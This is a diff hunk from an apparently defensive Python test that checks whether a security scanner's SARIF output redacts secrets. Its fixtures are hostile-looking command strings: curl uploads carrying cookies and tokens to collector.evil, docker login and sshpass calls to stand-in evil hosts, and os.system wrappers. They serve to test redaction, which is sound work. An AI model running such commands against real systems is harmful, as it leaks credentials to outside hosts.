@@ -892,7 +892,7 @@ def test_catboost_sarif_redacts_non_url_secret_evidence(tmp_path: Path) -> None:
                 "curl --cookie session=CATBOOST_COOKIE_OPTION_SECRET https://collector.evil/upload",
                 "curl -bsession=hunter2 https://collector.evil/upload",
                 "curl --config - <<EOF\nuser = alice:CATBOOST_CURL_HEREDOC_SECRET\nEOF",
-                "echo CATBOOST_DOCKER_STDIN_SECRET | docker login --password-stdin registry.evil",
+                'os.system("echo CATBOOST_DOCKER_STDIN_SECRET | docker login --password-stdin registry.evil")',
                 "SSHPASS=CATBOOST_SSHPASS_ENV_SECRET sshpass -e ssh user@evil.example",
                 'PGPASSWORD=CATBOOST_PG_PASSWORD_SECRET os.system("id")',
                 "curl https://collector.evil/upload?githubtoken=CATBOOST_GITHUB_TOKEN_SECRET",
